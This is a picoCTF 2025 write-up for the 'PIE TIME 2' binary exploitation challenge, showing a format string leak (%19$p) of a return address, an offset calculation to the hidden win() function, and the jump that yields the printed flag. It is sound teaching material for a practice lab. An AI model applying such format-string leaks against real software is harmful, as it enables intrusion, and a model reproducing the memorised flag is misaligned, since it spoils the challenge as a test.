# PicoCTF 2025

## PIE TIME 2

> Can you try to get the flag? I'm not revealing anything anymore!!  
> Author: DARKRAICG492  
> [`PIE TIME 2`](PIE_TIME_2)

**Tags:** binary_exploitation

---

## ðŸ§¾ Overview

This is a follow-up to PIE TIME. This time, the binary doesn't give us the address of `main()` up front, but there's a format string vulnerability in how it prints our input. Our goal is to leak a return address using `%p`, use that to calculate the address of the hidden `win()` function, and jump to it to get the flag.

---

## âœ… Solution

I connected to the challenge with:

```bash
nc rescued-float.picoctf.net 50509
```

When it asked for my name, I used the format string:

```
%19$p
```

The program printed:

```
0x5643dfe0f441
```

This leaked address is the return address to `main()`, at offset `<main+65>`. From looking at the binary's symbols, I knew that the offset between this return address and the start of `win()` is `0xd7` (215 in decimal).

So I calculated the address of `win()` like this:

```bash
python3 -c "print(hex(0x5643dfe0f441 - 0xd7))"
```

Output:

```
0x5643dfe0f36a
```

When the program prompted:

```
 enter the address to jump to, ex => 0x12345:
```

I entered:

```
0x5643dfe0f36a
```

And got:

```
You won!
picoCTF{p13_5h0u1dn'7_134k_dc29b3d5}
```

---

## Flag

```
picoCTF{p13_5h0u1dn'7_134k_dc29b3d5}
```
